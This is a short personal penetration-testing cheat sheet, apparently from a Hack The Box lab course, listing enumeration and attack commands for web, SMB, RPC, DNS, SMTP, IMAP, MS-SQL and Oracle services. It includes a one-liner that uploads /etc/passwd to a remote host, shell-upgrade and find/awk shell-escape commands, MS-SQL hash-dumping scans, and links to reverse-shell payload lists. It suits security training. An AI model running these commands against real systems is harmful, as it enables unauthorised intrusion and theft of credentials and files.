# Cheet Sheet

## Crawling
### python
python3 ReconSpider.py http://inlanefreight.com

## Upload
### python 1-liner
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'

## Fuzzing

### fuff
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://94.237.48.60:57525/ -H "Host: FUZZ.inlanefreight.htb" -fs 116


### Gobuster
gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt

## Payload
cheetsheet1:[https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/]
cheetsheet2:[https://github.com/swisskyrepo/PayloadsAllTheThings]
cheetsheet3:[https://gtfobins.github.io]

## Privilege Escalation
LinPEAS

## Upgrade Shell
python -c 'import pty; pty.spawn("/bin/bash")'

## Nmap

### Convert results of nmap into html
nmap -sC -sV 10.10.10.10 -oX taregt.xml
xsltproc target.xml -o target.html

## SMB
smbclient -N -L //<FQDN/IP>
smbclient //<FQDN/IP>/<share>

## RPClient
rpcclient -U "" <FQDN/IP>
srvinfo
### Brute Forcing User RIDs
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done

## NFS
sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock

## DNS
### Bruteforce to search subdomain
dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>

## SMTP
### Existing User 
msfconsole
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS <target_ip>
set USER_FILE /path/to/userlist.txt
run

## IMAP/POP3
### nmap specific port
nmap -sV -sC 10.129.160.110 -p110,143,993,995

### Search the mailbox on the imapserver 
a004 FETCH 1:* (BODY.PEEK[HEADER.FIELDS (FROM SUBJECT)])
### If you find the above command read the full mail including custom header
a004 FETCH 1 (RFC822)

## MS-SQL
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.149.195
### Connect with pyhon
impacket-mssqlclient backdoor:Password1@10.129.149.195 -windows-auth

## Oracle-TNS
sudo nmap -p1521 -sV 10.129.205.19 --open --script oracle-sid-brute

### Windows RDP
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!

## Find shell
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;